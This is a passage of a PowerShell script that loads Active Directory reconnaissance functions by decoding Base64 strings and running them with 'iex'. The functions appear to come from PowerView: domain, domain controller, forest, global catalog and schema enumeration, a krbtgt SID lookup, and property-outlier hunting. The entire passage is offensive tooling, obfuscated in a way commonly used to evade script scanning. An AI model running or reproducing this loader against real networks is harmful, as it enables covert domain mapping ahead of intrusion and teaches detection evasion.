0eSAkXy5OYW1lICRfLlZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRE5TUmVjb3JkJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yOiAkXyIKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluRE5TUmVjb3JkXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRE5TU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbiB7CiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREb21haW4sCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnW0dldC1Eb21haW5dIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LURvbWFpbicKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Eb21haW4KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBmcm9tIC1DcmVkZW50aWFsIgogICAgICAgICAgICB9CiAgICAgICAgICAgICREb21haW5Db250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0RvbWFpbicsICRUYXJnZXREb21haW4sICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZG9lcyBub3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIHRoZXJlIGlzbid0IGFuIGV4aXN0aW5nIHRydXN0LCBvciB0aGUgc3BlY2lmaWVkIGNyZWRlbnRpYWxzIGFyZSBpbnZhbGlkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJERvbWFpbikKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gVGhlIHNwZWNpZmllZCBkb21haW4gJyREb21haW4nIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LURvbWFpbkNvbnRyb2xsZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXInKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbkNvbnRyb2xsZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdEb21haW5Db250cm9sbGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VydmVyLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJExEQVAsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVAnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICAkQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAnKHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj04MTkyKScKICAgICAgICAgICAgR2V0LURvbWFpbkNvbXB1dGVyIEBBcmd1bWVudHMKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRGb3VuZERvbWFpbiA9IEdldC1Eb21haW4gQEFyZ3VtZW50cwogICAgICAgICAgICBpZiAoJEZvdW5kRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkRm91bmREb21haW4uRG9tYWluQ29udHJvbGxlcnMKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdCB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Gb3Jlc3RdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyBmb3IgR2V0LUZvcmVzdCIKICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsKICAgICAgICAgICAgICAgICRUYXJnZXRGb3Jlc3QgPSAkRm9yZXN0CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0Rm9yZXN0ID0gJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5Eb21haW4KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRm9yZXN0XSBFeHRyYWN0ZWQgZG9tYWluICckRm9yZXN0JyBmcm9tIC1DcmVkZW50aWFsIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRGb3Jlc3RDb250ZXh0ID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRpcmVjdG9yeUNvbnRleHQoJ0ZvcmVzdCcsICRUYXJnZXRGb3Jlc3QsICRDcmVkZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlhbCgpLlBhc3N3b3JkKQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRUYXJnZXRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCwgb3IgdGhlIHNwZWNpZmllZCBjcmVkZW50aWFscyBhcmUgaW52YWxpZDogJF8iCiAgICAgICAgICAgICAgICAkTnVsbAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgewogICAgICAgICAgICAkRm9yZXN0Q29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdGb3Jlc3QnLCAkRm9yZXN0KQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEZvcmVzdCgkRm9yZXN0Q29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LUZvcmVzdF0gVGhlIHNwZWNpZmllZCBmb3Jlc3QgJyRGb3Jlc3QnIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdDogJF8iCiAgICAgICAgICAgICAgICByZXR1cm4gJE51bGwKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgJEZvcmVzdE9iamVjdCA9IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkZvcmVzdF06OkdldEN1cnJlbnRGb3Jlc3QoKQogICAgICAgIH0KICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKICAgICAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAoR2V0LURvbWFpblVzZXIgLUlkZW50aXR5ICJrcmJ0Z3QiIC1Eb21haW4gJEZvcmVzdE9iamVjdC5Sb290RG9tYWluLk5hbWUgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwpLm9iamVjdHNpZAogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEZvcmVzdFNpZCA9IChHZXQtRG9tYWluVXNlciAtSWRlbnRpdHkgImtyYnRndCIgLURvbWFpbiAkRm9yZXN0T2JqZWN0LlJvb3REb21haW4uTmFtZSkub2JqZWN0c2lkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFBhcnRzID0gJEZvcmVzdFNpZCAtU3BsaXQgJy0nCiAgICAgICAgICAgICRGb3Jlc3RTaWQgPSAkUGFydHNbMC4uJCgkUGFydHMubGVuZ3RoLTIpXSAtam9pbiAnLScKICAgICAgICAgICAgJEZvcmVzdE9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdSb290RG9tYWluU2lkJyAkRm9yZXN0U2lkCiAgICAgICAgICAgICRGb3Jlc3RPYmplY3QKICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdERvbWFpbiB7CiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRm9yZXN0LAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0ZvcmVzdCddKSB7ICRBcmd1bWVudHNbJ0ZvcmVzdCddID0gJEZvcmVzdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAkRm9yZXN0T2JqZWN0ID0gR2V0LUZvcmVzdCBAQXJndW1lbnRzCiAgICAgICAgaWYgKCRGb3Jlc3RPYmplY3QpIHsKICAgICAgICAgICAgJEZvcmVzdE9iamVjdC5Eb21haW5zCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdEdsb2JhbENhdGFsb2cgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5Lkdsb2JhbENhdGFsb2cnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGb3Jlc3QsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICAkQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRm9yZXN0J10pIHsgJEFyZ3VtZW50c1snRm9yZXN0J10gPSAkRm9yZXN0IH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJEFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRGb3Jlc3RPYmplY3QgPSBHZXQtRm9yZXN0IEBBcmd1bWVudHMKICAgICAgICBpZiAoJEZvcmVzdE9iamVjdCkgewogICAgICAgICAgICAkRm9yZXN0T2JqZWN0LkZpbmRBbGxHbG9iYWxDYXRhbG9ncygpCiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUZvcmVzdFNjaGVtYUNsYXNzIHsKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5BY3RpdmVEaXJlY3RvcnlTY2hlbWFDbGFzc10pXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0NsYXNzJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENsYXNzTmFtZSwKICAgICAgICBbQWxpYXMoJ05hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZvcmVzdCwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgICRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGb3Jlc3QnXSkgeyAkQXJndW1lbnRzWydGb3Jlc3QnXSA9ICRGb3Jlc3QgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgJEZvcmVzdE9iamVjdCA9IEdldC1Gb3Jlc3QgQEFyZ3VtZW50cwogICAgICAgIGlmICgkRm9yZXN0T2JqZWN0KSB7CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NsYXNzTmFtZSddKSB7CiAgICAgICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q2xhc3MgaW4gJENsYXNzTmFtZSkgewogICAgICAgICAgICAgICAgICAgICRGb3Jlc3RPYmplY3QuU2NoZW1hLkZpbmRDbGFzcygkVGFyZ2V0Q2xhc3MpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkRm9yZXN0T2JqZWN0LlNjaGVtYS5GaW5kQWxsQ2xhc3NlcygpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRmluZC1Eb21haW5PYmplY3RQcm9wZXJ0eU91dGxpZXIgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUHJvcGVydHlPdXRsaWVyJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdDbGFzc05hbWUnKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDbGFzc05hbWUnKV0KICAgICAgICBbQWxpYXMoJ0NsYXNzJyldCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdVc2VyJywgJ0dyb3VwJywgJ0NvbXB1dGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ2xhc3NOYW1lLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRSZWZlcmVuY2VQcm9wZXJ0eVNldCwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIE1hbmRhdG9yeSA9ICRUcnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ1JlZmVyZW5jZU9iamVjdCcpXQogICAgICAgIFtQU0N1c3RvbU9iamVjdF0KICAgICAgICAkUmVmZXJlbmNlT2JqZWN0LAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdGaWx0ZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRMREFQRmlsdGVyLAogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKICAgICAgICBbVmFsaWRhdGVTZXQoJ0Jhc2UnLCAnT25lTGV2ZWwnLCAnU3VidHJlZScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlYXJjaFNjb3BlID0gJ1N1YnRyZWUnLAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFRvbWJzdG9uZSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIEJFR0lOIHsKICAgICAgICAkVXNlclJlZmVyZW5jZVByb3BlcnR5U2V0ID0gQCgnYWRtaW5jb3VudCcsJ2FjY291bnRleHBpcmVzJywnYmFkcGFzc3dvcmR0aW1lJywnYmFkcHdkY291bnQnLCdjbicsJ2NvZGVwYWdlJywnY291bnRyeWNvZGUnLCdkZXNjcmlwdGlvbicsICdkaXNwbGF5bmFtZScsJ2Rpc3Rpbmd1aXNoZWRuYW1lJywnZHNjb3JlcHJvcGFnYXRpb25kYXRhJywnZ2l2ZW5uYW1lJywnaW5zdGFuY2V0eXBlJywnaXNjcml0aWNhbHN5c3RlbW9iamVjdCcsJ2xhc3Rsb2dvZmYnLCdsYXN0bG9nb24nLCdsYXN0bG9nb250aW1lc3RhbXAnLCdsb2Nrb3V0dGltZScsJ2xvZ29uY291bnQnLCdtZW1iZXJvZicsJ21zZHMtc3VwcG9ydGVkZW5jcnlwdGlvbnR5cGVzJywnbmFtZScsJ29iamVjdGNhdGVnb3J5Jywnb2JqZWN0Y2xhc3MnLCdvYmplY3RndWlkJywnb2JqZWN0c2lkJywncHJpbWFyeWdyb3VwaWQnLCdwd2RsYXN0c2V0Jywnc2FtYWNjb3VudG5hbWUnLCdzYW1hY2NvdW50dHlwZScsJ3NuJywndXNlcmFjY291bnRjb250cm9sJywndXNlcnByaW5jaXBhbG5hbWUnLCd1c25jaGFuZ2VkJywndXNuY3JlYXRlZCcsJ3doZW5jaGFuZ2VkJywnd2hlbmNy